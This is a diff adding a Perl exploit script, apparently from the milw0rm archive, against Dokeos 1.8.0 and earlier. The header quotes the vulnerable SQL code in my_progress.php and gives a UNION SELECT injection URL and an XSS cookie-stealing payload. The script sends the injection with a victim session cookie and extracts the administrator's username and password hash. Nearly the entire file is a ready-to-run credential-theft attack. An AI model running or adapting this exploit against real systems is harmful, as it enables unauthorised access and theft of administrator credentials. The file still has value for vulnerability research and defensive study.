@@ -1,0 +1,85 @@
+#!/usr/bin/perl -w
+
+#################################################################################
+#                                        					#
+#                    Dokeos <= 1.8.0 SQL Injection Exploit            		#
+#                                        					#
+# Discovered by: Silentz                            				#
+# Payload: Admin Username & Hash Retrieval                    			#
+# Website: http://www.w4ck1ng.com                        			#
+#                                         					#
+# Vulnerable Code (my_progress.php):                         			# 
+#                                        					#
+#    if(isset($_GET['course'])) {$sqlInfosCourse = "SELECT course.code,    	#
+#  course.title,course.db_name,CONCAT(user.firstname,' ',user.lastname ,' / ',  #
+#  user.email) as tutor_infos FROM $tbl_user as user,$tbl_course as course INNER#
+#  JOIN $tbl_session_course as sessionCourse ON sessionCourse.course_code =     #
+#  course.code WHERE sessionCourse.id_coach = user.user_id AND course.code=     #
+#  '".$_GET['course']."'";                           				#
+#                                        					#
+#                                       					#
+# PoC: http://victim.com/dokeos/main/auth/my_progress.php?course=-999'         	# 
+#      UNION SELECT 0,password,0,username FROM user where user_id = '1'/*    	#
+#                                        					#
+#                                         					#
+# Subject To: magic_quotes_gpc set to off & have an already existant         	# 
+#             student/teacher account                        			#
+#                                        					#
+# GoogleDork: Get your own!                            				#
+# Shoutz: The entire w4ck1ng community                        			# 
+#                                        					#
+# Notes: To obtain SESSION_ID field you can log on and XSS yourself, like so:   #
+#                                        					#
+#     http://victim.com/dokeos/main/inc/lib/fckeditor/editor/plugins/    	#
+#     ImageManager/editor.php?img="><script>alert(document.cookie)</script>    	#
+#                                        					# 
+#     Also, the amount of XSS vulnerabilites in this application is truely    	#
+#     unbelievable.                                				#
+#                                        					#
+################################################################################# 
+
+use LWP::UserAgent;
+if (@ARGV < 2){
+print "-------------------------------------------------------------------------\r\n";
+print "                  Dokeos <= 1.8.0 SQL Injection Exploit\r\n"; 
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\r\n\r\n";
+print "[PATH] = Path where Dokeos is located\r\n"; 
+print "[SESSION_ID] = Session identifier of logged on user\r\n\r\n";
+print "e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "                     http://www.w4ck1ng.com\r\n ";
+print "                            ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+exit();
+}
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n"; 
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$cookie = "$ARGV[1];";
+$host = $ARGV[0] . "main/auth/my_progress.php?course=-999' UNION SELECT 0,password,0,username FROM user where user_id = '1'/*"; 
+
+my @cookie = ('Cookie' => "dk_sid=$cookie;");
+my $res = $b->get($host, @cookie);
+
+$answer = $res->content;
+if ($answer =~ / - Coach : (.*?)<\/strong>/){
+print "-------------------------------------------------------------------------\r\n"; 
+print "                  Dokeos <= 1.8.0 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "[+] Admin User : $1\n"; 
+}
+
+if ($answer =~/<strong>([0-9a-fA-F]{32}) - Coach :/){
+print "[+] Admin Hash : $1\n";
+print "-------------------------------------------------------------------------\r\n";
+print "                      http://www.w4ck1ng.com\r\n";
+print "                            ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+}
+
+else { 
+  print "\nExploit Failed...\n";
+}
+
+# milw0rm.com [2007-05-23]
